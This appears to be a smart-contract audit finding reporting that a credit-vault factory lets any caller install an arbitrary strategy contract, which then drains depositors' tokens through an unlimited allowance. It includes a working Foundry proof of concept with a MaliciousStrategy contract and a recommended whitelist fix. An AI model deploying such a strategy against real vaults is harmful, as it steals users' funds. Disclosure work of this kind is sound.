### Title
Permissionless factory installs attacker-controlled strategy code that can drain deposits - ([File: contracts/IdleCreditVaultFactory.sol](contracts/IdleCreditVaultFactory.sol))

### Summary

`deployCreditVault` accepts `strategyData.implementation` directly from an unprivileged caller and deploys a transparent proxy to that arbitrary implementation. During vault initialization, the legitimate `IdleCDOCreditVault` grants unlimited underlying-token allowance to the configured strategy. On the first deposit, the attacker-controlled strategy’s `deposit` function can use that allowance to transfer the entire deposit from the CDO to the attacker.

### Finding Description

`IdleCreditVaultFactory.deployCreditVault` is externally callable and does not restrict `strategyData.implementation` to a known-good implementation. It passes the attacker-supplied address to `_deployProxy`, which creates a `TransparentUpgradeableProxy` using that implementation and immediately delegatecalls its initializer. [1](#0-0) [2](#0-1) 

The credit-vault CDO then stores this attacker-controlled strategy and grants it unlimited allowances for both the underlying token and strategy token. [3](#0-2) 

During `depositAA`, the CDO first pulls the victim’s underlying tokens and mints tranche tokens based on the received balance. It then calls `IIdleCDOStrategy(strategy).deposit(_amount)` while the unlimited strategy allowance remains active. [4](#0-3) 

An attacker-supplied strategy can therefore implement a compatible `deposit(uint256)` function that calls `underlying.transferFrom(msg.sender, attacker, amount)`, draining the deposit from the CDO.

### Impact Explanation

A victim who deposits `N` underlying tokens receives tranche tokens, but the malicious strategy immediately transfers all `N` underlying tokens from the CDO to the attacker. The victim’s tranches are then backed only by whatever strategy-token accounting the malicious strategy returns, resulting in a direct loss of the full deposit.

This is analogous to installing an arbitrary community package: the trusted deployment pipeline executes caller-selected code, but here the installed code gains an unlimited allowance over pool assets.

### Likelihood Explanation

Any EOA can call `deployCreditVault`, supply a malicious strategy implementation, and obtain a factory-emitted `CreditVaultDeployed` event nominally associated with the legitimate CDO and treasury configuration. No privileged role, existing deposit, oracle manipulation, borrower misconduct, or timing dependence is required.

The attack requires convincing a lender to deposit into the attacker-created vault, but the factory does not distinguish approved implementations from arbitrary implementations.

### Recommendation

Do not accept implementation addresses from arbitrary callers. Store an owner- or treasury-controlled whitelist of approved CDO, strategy, queue, programmable-borrower, and write-off implementations in the factory and reject every implementation not on that whitelist.

Alternatively, deploy known implementation addresses internally rather than accepting them as deployment parameters. Factory events or deployments should also expose an `approvedImplementation` indicator so integrations do not treat arbitrary factory-created vaults as equivalent.

### Proof of Concept

The following Foundry-style PoC demonstrates the drain during the buffer phase, before any epoch starts:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import {IdleCreditVaultFactory} from "../contracts/IdleCreditVaultFactory.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract Underlying is ERC20 {
  constructor() ERC20("USD Coin", "USDC") {}

  function decimals() public pure override returns (uint8) {
    return 6;
  }

  function mint(address to, uint256 amount) external {
    _mint(to, amount);
  }
}

contract MaliciousStrategy is ERC20 {
  address public token;
  address public cdo;
  address public attacker;
  address public owner;

  constructor(address _attacker) ERC20("Malicious Strategy", "MAL") {
    attacker = _attacker;
  }

  function initialize(
    address _underlying,
    address _owner,
    address,
    address,
    string memory,
    uint256
  ) external {
    token = _underlying;
    owner = _owner;
  }

  function strategyToken() external view returns (address) {
    return address(this);
  }

  function decimals() public view override returns (uint8) {
    return IERC20Detailed(token).decimals();
  }

  function setAprs(uint256, uint256) external {}

  function setWhitelistedCDO(address _cdo) external {
    cdo = _cdo;
  }

  function transferOwnership(address _owner) external {
    owner = _owner;
  }

  function getApr() external pure returns (uint256) {
    return 0;
  }

  function deposit(uint256 amount) external {
    // msg.sender is the CDO, which granted this strategy unlimited allowance.
    IERC20Detailed(token).transferFrom(msg.sender, attacker, amount);
  }
}

contract FactoryMaliciousStrategyTest is Test {
  function testFactoryInstalledStrategyDrainsDeposit() external {
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    address treasury = makeAddr("treasury");
    address proxyAdmin = makeAddr("proxyAdmin");
    address manager = makeAddr("manager");
    address borrower = makeAddr("borrower");

    Underlying underlying = new Underlying();
    MaliciousStrategy maliciousStrategy = new MaliciousStrategy(attacker);
    IdleCDOEpochVariant cdoImplementation = new IdleCDOEpochVariant();

    IdleCreditVaultFactory factoryImplementation = new IdleCreditVaultFactory();
    IdleCreditVaultFactory factory = IdleCreditVaultFactory(
      address(
        new TransparentUpgradeableProxy(
          address(factoryImplementation),
          proxyAdmin,
          abi.encodeWithSelector(
            IdleCreditVaultFactory.initialize.selector,
            treasury,
            proxyAdmin
          )
        )
      )
    );

    vm.prank(attacker);
    factory.deployCreditVault(
      IdleCreditVaultFactory.CreditVaultParams({
        implementation: address(cdoImplementation),
        limit: 0,
        underlying: address(underlying),
        apr: 0,
        epochDuration: 7 days,
        bufferPeriod: 1 days,
        instantWithdrawDelay: 0,
        instantWithdrawAprDelta: 0,
        disableInstantWithdraw: true,
        keyringPolicy: 0,
        feeReceiver: makeAddr("feeReceiver"),
        fees: 5_000,
        managementFee: 0,
        isInterestMinted: false,
        isDepositDuringEpochDisabled: true
      }),
      IdleCreditVaultFactory.StrategyData({
        implementation: address(maliciousStrategy),
        manager: manager,
        borrower: borrower,
        borrowerName: "Victim Pool"
      }),
      IdleCreditVaultFactory.AncillaryParams({
        keyring: address(0),
        queueImplementation: address(0),
        prefundedDepositWindow: 0,
        writeOffImplementation: address(0)
      })
    );

    IdleCDOEpochVariant cdo = IdleCDOEpochVariant(maliciousStrategy.cdo());
    uint256 depositAmount = 1_000_000e6;

    underlying.mint(victim, depositAmount);
    vm.startPrank(victim);
    underlying.approve(address(cdo), depositAmount);
    cdo.depositAA(depositAmount);
    vm.stopPrank();

    assertEq(underlying.balanceOf(attacker), depositAmount);
    assertEq(underlying.balanceOf(address(cdo)), 0);
    assertGt(cdo.AATranche().balanceOf(victim), 0);
  }
}
```

### Citations

**File:** contracts/IdleCreditVaultFactory.sol (L92-105)
```text
  function deployCreditVault(
    CreditVaultParams memory cvParams,
    StrategyData memory strategyData,
    AncillaryParams memory ancillaryParams
  ) external {
    _checkMinimumFees(cvParams);
    address manager = strategyData.manager;
    if (manager == address(0)) revert Is0();

    (IdleCDOEpochVariant cv, IdleCreditVault strategy) =
      _deployBaseCreditVault(strategyData, cvParams);

    address keyringWhitelist = _deployKeyring(ancillaryParams);
    _configureCreditVault(cv, strategy, cvParams, keyringWhitelist, manager);
```

**File:** contracts/IdleCreditVaultFactory.sol (L280-285)
```text
  function _deployProxy(address implementation, bytes memory data) internal returns (address) {
    return address(new TransparentUpgradeableProxy(
      implementation,
      proxyAdmin,
      data
    ));
```

**File:** contracts/IdleCDOCreditVault.sol (L68-79)
```text
    token = _guardedToken;
    strategy = _strategy;
    strategyToken = _strategyToken;
    trancheAPRSplitRatio = _trancheAPRSplitRatio;
    uint256 _oneToken = 10**(IERC20Detailed(_guardedToken).decimals());
    oneToken = _oneToken;
    priceAA = _oneToken;
    priceBB = _oneToken;
    // skipDefaultCheck = false is the default value
    // Set allowance for strategy
    _allowUnlimitedSpend(_guardedToken, _strategy);
    _allowUnlimitedSpend(_strategyToken, _strategy);
```

**File:** contracts/IdleCDOCreditVault.sol (L191-211)
```text
  function _deposit(uint256 _amount, address _tranche) internal virtual whenNotPaused returns (uint256 _minted) {
    if (_amount == 0) {
      return _minted;
    }
    // check that we are not depositing more than the contract available limit
    _guarded(_amount);
    // interest accrued since last depositXX/withdrawXX is splitted between AA and BB
    // according to trancheAPRSplitRatio. NAVs of AA and BB are updated and tranche
    // prices adjusted accordingly
    _updateAccounting();
    // get underlyings from sender
    address _token = token;
    uint256 _preBal = _contractTokenBalance(_token);
    _transferUnderlyingsFrom(msg.sender, address(this), _amount);
    // mint tranche tokens according to the current tranche price
    _minted = _mintSharesAtCurrPrice(_contractTokenBalance(_token) - _preBal, msg.sender, _tranche);
    // update trancheAPRSplitRatio
    _updateSplitRatio(_getAARatio(true));

    // direct deposit in the strategy
    IIdleCDOStrategy(strategy).deposit(_amount);
```
